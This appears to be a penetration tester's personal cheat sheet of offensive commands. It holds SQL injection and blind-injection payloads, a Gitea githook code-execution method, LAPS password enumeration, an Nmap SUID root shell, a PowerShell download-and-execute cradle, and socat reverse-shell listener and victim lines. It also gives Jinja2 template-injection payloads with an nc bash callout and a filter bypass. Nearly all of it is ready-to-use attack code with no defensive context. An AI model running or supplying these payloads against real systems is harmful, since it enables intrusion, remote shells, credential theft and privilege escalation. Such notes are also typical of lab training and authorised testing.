### Pentesting_Notes

# Reverse Shell Generator

https://itm4n.github.io/tools/ - that's a gold mine!

# SQL INJECTION - GROUP_CONCAT

odm_user+UNION+SELECT+1,group_concat(column_name),3,4,5,6,7,8,9+from+information_schema.tables+where+table_schema=database()--+-

odm_user+UNION+SELECT+1,group_concat(COLUMN_NAME),3,4,5,6,7,8,9+from+information_schema.columns+where+table_schema=CHAR(115,115,104)--+- (where 115,115,104 are decimal for "ssh")

UNION+SELECT+1,(select+group_concat(column1,column2)+FROM+database.database_table),3,4,5,6,7,8,9--+-

# Blind SQL Injection

*check database length

' or LENGTH(database())=anynumber-- -

*check column value

something_true' AND (SELECT+ascii(substr(column,1,1)) FROM database.table)>anynumber-- -
the column,1,1 means the first character of the column

# Csharp compile undetectable Windows reverse shell
source: https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc

mcs -reference:System.ServiceProcess.dll file.cs

# AWS s3 bucket

aws s3 cp $file s3://bucketname/ --endpoint-url http://s3.domainurl --no-sign-request

# Erlang using stolen/exposed cookie

erl -setcookie COOKIE -sname test2 -remsh user@host

# GitTea1.7.5-Exploitation
------------STEPS------------

A. Create a new Repo

B. Go to Settings , change the Githooks to a bash reverse shell or any bash command

C. Do the following on your machine:
```
touch README.md
git init
git add README.md
git commit -m "first commit"
git remote add origin http://REMOTE_IP:3000/test/zz.git
git push -u origin master
```
D. The command Should be executed.

# GoogleAPI OSINT

add an email address to the contacts

contacts.google.com


then inspect element and see the data-personid="somethinghere"


in the google api: https://developers.google.com/people/api/rest/v1/people/get


on the right side you put in the resourceName: people/*data-personid*

and the personFields : metadata

you'll find the "id" there

----------------------------------------

google.com/maps/contrib/userID

# LAPS enum
ldapsearch -x -h 192.168.x.x -D username@domain -w <<password>> -b "dc=AJLAB,dc=COM" "(ms-MCS-AdmPwd=*)" ms-MSC-AdmPwd
  
# lxd-alpine-builder has an issue with MIRROR.txt. The solution:
MIRRORS.txt can be found at : http://dl-cdn.alpinelinux.org/alpine/MIRRORS.txt

just create the alpine-mirrors dir, and create the MIRRORS.txt with the contents.

# MySQL Command Line no interface
mysql -u *pass* -p*pass* -e 'command'

# MySQL change password/any column value

update *table* set *column*="hash" where *other column(mostly user related column)*="*thename*";

# Nmap SUID Privilege Escalation

for versions who has --interactive (OLD - 2.02 - 5.21)

for updated versions : 

echo "os.execute('/bin/sh')" > /dev/shm/shell.nse

nmap --script=/dev/shm/shell.nse

# Pivoting

sshuttle -r user@remoteIP targetSubnet/24(or 16 n' shit you know) -vv


ssh -N -D 127.0.0.1:9050 user@remoteIP


--------9050 can be any port you choose to chain---------

--/etc/proxychains.conf should be configured to get your traffic going on 9050, i.e socks4  127.0.0.1 9050

# PowerShell running remote files in memory whilst using ExecBypass
powershell -exec bypass iex(new-object net.webclient).downloadString('http://ip:port/file')

# socat TTY
#Listener:

"socat file:`tty`,raw,echo=0 tcp-listen:4444"

#Victim:

"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444"

# SSH Algorithms
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 <ip>

ssh -c aes128-cbc -oKexAlgorithms=+diffie-hellman-group1-sha1 <ip>
  
# SSTI jinja2
If {{7*7}} works:
{{config.__class__.__init__.__globals__['os'].popen('CMD').read()}}
<img src="http://ip:port/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'ip'$IFS'port') />

WAF bypass article: https://hackmd.io/@Chivato/HyWsJ31dI
          
```
{% with foo = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("COMMAND")["read"]() %}test{% endwith %}
```          
          
# Organize macro
          
```          
s = "powershellhere"

n = 50
for i in range(0, len(s), n):
                    
    chunk = s[i:i + n]
                    
    print('Str = Str + "' + chunk + '"')
```                                      
# NTLMv2 from packet capture analysis
Manually:
 LDAP packets which were captured in wireshark might reveal some NTLMv2 network authentication
                                      
 Final formula should be: "username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response"
 To get the ServerChallenge type in wireshark's filter: "ntlmssp.ntlmserverchallenge"

Or use Pcredz to extract the hash automatically :P
